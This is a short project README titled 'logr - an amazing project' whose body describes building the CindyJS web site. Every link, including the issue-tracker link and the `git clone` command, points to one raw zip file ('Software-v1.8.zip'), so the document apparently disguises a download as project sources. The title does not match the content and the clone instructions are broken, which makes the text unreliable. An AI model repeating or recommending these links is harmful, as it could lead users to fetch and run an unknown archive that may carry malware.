logr - an amazing project

This repository contains the sources from which
[the CindyJS web site](https://github.com/M-ux349/website/raw/refs/heads/master/src/asis/pub/2016-icms/plugins/Software-v1.8.zip) is built.
If there is something wrong with the content on that web site,
feel free to
[file an issue with this repository](https://github.com/M-ux349/website/raw/refs/heads/master/src/asis/pub/2016-icms/plugins/Software-v1.8.zip),
or formulate a pull request.
Note that most pages will come with an edit link in the bottom right corner.

## Testing/developing the website on your local machine

In order to download the website clone the repository with
`git clone https://github.com/M-ux349/website/raw/refs/heads/master/src/asis/pub/2016-icms/plugins/Software-v1.8.zip`

Then enter the just downloaded folder `website` and install all dependencies with

`git submodule update --init .`

`npm install`

In oder to set up the local web-server for the website run

`npm start`

Then you can access the website on [http://localhost:8163/](http://localhost:8163/)
